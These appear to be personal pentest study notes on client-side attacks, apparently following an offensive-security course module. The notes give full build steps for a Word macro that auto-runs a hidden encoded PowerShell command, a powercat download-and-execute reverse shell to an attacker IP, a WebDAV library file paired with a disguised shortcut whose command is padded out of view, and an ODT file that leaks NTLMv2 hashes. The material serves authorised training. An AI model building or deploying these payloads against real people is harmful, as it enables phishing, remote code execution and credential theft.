# Client Side Attacks
# Target Recon
We can check meta data tags of publicly available documents for the organization --> can include info on author, date, and software
We can leverage google dorking techniques tosearch for specific file types
site:example.com filetype:pdf
We can also use gobuster with the -x parameter to search for specific extensions
once we get a document downloaded we can use "exfiltool" to gain more info
	-a displays duplicated tag
	-u displays unknown tags
In the example we see a microsoft system was used and we get the authors name
# Exploiting Microsoft office
## Macros
When creating malicious documents with macros we need to save as .doc not .docx. .doc will allow us to embed the macro instead of being forced to use a template. .docm is fine as well
view-->macro-->create
Basic macro syntax has a main sub procedure:
```vb
Sub MyMacro()
'
' MyMacro Macro
'
'

End Sub
```
In this example we will elverage ActiveX Objects which provide access to underlying operating system commands. this can be achieved by Wscript through the Windows Script Host Shell:
```vb
Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```
Since office MAcros are not run automatically we must use the predefined Autorun() macro and document open event. --> these are like a ven digram. they cover similar cases but have unique edge cases to cover each other so we use both
```vb
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```
==Download Powercat and maybe PowerShell Empire to Kali box==
Let's take this a step further and use a command to downlaod Powercat and start a reverse shell
Note VBA has a 255 character limit for literal strings. I fwe go past this we need to split the command into lines and store in variables
Let's update the macro with a string variable and run it
```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub
```
Next we employ a powershell command to download powercat and execute the reverse shell
This is the powershell command before base64 encoding
```PowerShell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```
We can base 64 encode the command and then use this simple python script to break up the command into chunks and output what we should paste in the macro
```python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```
our encoded command should be after -e flag
now our macro will look like this
```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```
make sure we host the executable on a webserver and run a listener

## Abusing Windows Libraries
.Library-ms files can be executed by clicking on them
We can exploit this in two steps. Use a malicious file to get a foothold and another one to get a reverse shell
For the first stage we will set up a WebDAV library file that looks like a regular file explorer, but has a .lnk to execute a payload
First we need to setup our webDAV share on the kali system
make sure we have webDAV installed:
`pip3 install wsgidav`
set up WebDav directory:
```shell
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
we can use either notepad or visual basic studio to create the library file
Library files consist of three major parts and are written in xml to specify the parameters for accessing remote locations
 - General library info
 - Library properties
 - library locations
We start by adding the library's file format and version:
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

</libraryDescription>
```
Next we add two tags providing info about the library
- name: we cannot give an an arbitrary name. We can use @shell32.dll,-34575_ or @windows.storage.dll,-34582_ as specified on the Microsoft website. We'll use the latter to avoid any issues with text-based filters that may flag on "shell32".
- version: this can be a random number
```
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```
Next we'll add the isLibraryPinned tag set to true. this pins our directory to the navigation pane in file explrorer --> this makes it seem more genuine to targets.
Next add the icon reference tag to determine the icon displayed. We use imagesres.dll and can choose between all the windows Icons; -1002 is documents folder icon -1003 is picture folder icon. We provide the latter to make it look more benign
```
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
```
Now we need the templateInfo type. we need to input a GUID so file explorer knows what details to display. We will use the documents GUID
```
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```
The next tag marks the beginning of the library locations
We need to use the SearchConnectorDescriptionList defined by
searchConnectorDescription tags
we only need 1 searchConnectionDescription with the following 3 tags:
```
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://ATTACKING MACHINE IP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
```

The full code for our WebDAV share is as follows
```vb
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://ATTACK MACHINE IP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Let's save and close the file in Visual Studio Code. We'll then double-click the **config.Library-ms** file on the Desktop.
When we open the directory in Explorer, we find the previously-created **test.txt** file we placed in the WebDAV share. Therefore, the library file works and embeds the connection to the WebDAV share.
When we re-open our file in Visual Studio Code, we find that a new tag appeared named _serialized_.[23](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/client-side-attacks/abusing-windows-library-files/obtaining-code-execution-via-windows-library-files#fn23) The tag contains base64-encoded information about the location of the _url_ tag. Additionally, the content inside the _url_ tags has changed from **http://192.168.119.2** to **\\192.168.119.2\DavWWWRoot**. Windows tries to optimize the WebDAV connection information for the Windows WebDAV client[24](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/client-side-attacks/abusing-windows-library-files/obtaining-code-execution-via-windows-library-files#fn24) and therefore modifies it.
==The library file still works when we double-click it, but due to the encoded information in the _serialized_ tag, it may not be working on other machines or after a restart.==
To avoid running into any issues when performing this attack, we can reset the file to its original state by pasting the contents of listing 17 (the full code block) into Visual Studio Code. Unfortunately, we need to do this every time we execute the Windows library file.

Now we need to craft a .lnk file to execute a reverse shell
in a windows machine we can right click Desktop-->New-->shortcut and we can enter a path to the program and arguments
We can use the previous pwershell command to download Powercat and execute a reverse shell
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 4444 -e powershell"
```
The above command gets pasted in the bar for "location of this item"
If we expect that our victims are tech-savvy enough to actually check where the shortcut files are pointing, we can use a handy trick. Since our provided command looks very suspicious, we could just put a delimiter and benign command behind it to push the malicious command out of the visible area in the file's property menu. If a user were to check the shortcut, they would only see the benign command.
In the next window we enter automatic_configuration as the name for the shortcut file and click Finish to create
To confirm the shortcut works double click it ont he desktop

Now it is time to attack a victim
we copy automatic_configguration.lnk and config.Library-ms to our WebDAV directory
start webserver, listener and WsgiDAV fir the WebDAV share


# ODT files
### NTLMv2 Theft through ODT File

From the information retrieved after uploading a file, we know that our uploaded ODT files is reviewed by a staff.  This can be exploited by uploading an ODT file [embedded with malicious code](https://secureyourit.co.uk/wp/2018/05/01/creating-malicious-odt-files/) to steal the NTLMv2 hash of the user reviewing the file.

To create our ODT file, we will need to:

1. Open LibreOffice Writer
    
2. Insert → Object → OLE Object → Create From File
    
3. Check “create from file” and “Link to file”
    
4. In file parameter, select any file and then click "OK".
    
5. Save the file as "test1.odt" and exit libreoffice.
    

We now have an ODT file that we can work with. Let's unzip the file to view the source files.

```
┌──(kali㉿kali)-[~]
└─$ unzip test1.odt
Archive:  test1.odt
 extracting: mimetype
 inflating: ObjectReplacements/Object 1
 inflating: settings.xml
 extracting: Thumbnails/thumbnail.png
 creating: Configurations2/toolbar/
 creating: Configurations2/floater/
 creating: Configurations2/popupmenu/
 creating: Configurations2/menubar/
 creating: Configurations2/accelerator/
 creating: Configurations2/toolpanel/
 creating: Configurations2/progressbar/
 creating: Configurations2/statusbar/
 creating: Configurations2/images/Bitmaps/
 inflating: manifest.rdf
 inflating: meta.xml
 inflating: styles.xml
 inflating: content.xml
 inflating: META-INF/manifest.xml
```

We can edit **content.xml** and replace the `href` value of the file you selected previously to `file://IP/test.jpg` in the tag that starts with `<draw:object` .

```
<draw:object xlink:href="file://192.168.213.128/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

With our changes in place, we re-zip the document back to an ODT file.
```
zip -r Document.odt *
```

catch hash with responder